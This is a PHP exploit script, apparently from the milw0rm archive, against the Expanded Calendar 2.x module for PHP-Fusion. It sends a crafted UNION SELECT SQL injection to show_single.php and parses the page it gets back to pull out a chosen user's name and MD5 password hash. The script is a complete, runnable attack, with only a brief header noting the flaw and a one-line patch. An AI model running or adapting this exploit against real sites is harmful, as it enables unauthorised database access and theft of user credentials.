<?php
print_r("
/********************************************************
*      Expanded Calendar 2.x (PHP-Fusion module)        *
*      User pass disclosure exploit                     *
*      Found by Matrix86 of Rbt-4 Crew                  *
*      Site: www.rbt-4.net                              *
*      Mail: info[at]rbt-4[dot]net                      *
*********************************************************
* Bug found in                                          *
*      /infusions/calendar_events_panel/show_single.php *
* Line:                                                 *
*      27                                               *
* Vulnerability type: Sql injection                     *
* Unpatched!                                            *
* Patch:                                                *
* Line 26:                                              *
* if(!isset(\$sel)||!isNum(\$sel)) fallback(\"index.php\");
*
********************************************************/
");

if($argc < 4) die("Usage: ".$argv[0]." [site] [path] [user_id]\nExample: ".$argv[0]." localhost /php-fusion/ 1\n");

ini_set("max_execution_time",0);
ini_set("default_socket_timeout",4);

$host    = $argv[1];
$path    = $argv[2];
$user_id = $argv[3];
$port    = 80;

$sqlinit = "infusions/calendar_events_panel/show_single.php?sel=-1/**/UNION/**/SELECT/**/0,0,user_password,user_name,0,0,0,0,0,0,0,0/**/FROM/**/fusion_users/**/WHERE/**/user_id=";
$sqlend = "/*";

function send($req){
	global $host,$port;
	
	$ip = gethostbyname($host);
	if(stristr($host,$ip)) die("Error: Host not found\n");
	
	if(!($sock = fsockopen($ip,$port))) die("Error: unable open sock!\n");
	
	fputs($sock,$req);
	$response = "";
	while (!feof($sock)) {
		$response .= fgets ($sock,128);
	}
	fclose ($sock);
	return $response;
}

$packet = "GET ".$path.$sqlinit.$user_id.$sqlend." HTTP/1.0\r\n";
$packet.= "User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.7 (like Gecko)\r\n";
$packet.= "Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
echo "Packet:\n".$packet."\n\n";

$resp = send($packet);
$temp  = explode("<td colspan='2'><font size='4'><u>",$resp);
$temp2 = explode("<td colspan='3' style='border-style: solid; border-width: 1px; padding-left: 4px; padding-right: 4px; padding-top: 1px; padding-bottom: 1px'><font style='font-size: 11px'>",$temp[1]);
$temp3 = explode("</td>",$temp2[1]);
$username = $temp3[0];

if(isset($temp[1])) {
	$md5 = substr($temp[1],0,32);
	echo "Id user:  ".$user_id."\nUsername: ".$username."\nPassword: ".$md5."\n";
}
else echo("Bug Fixed..sorry!\n");

exit();
?>

# milw0rm.com [2007-10-01]
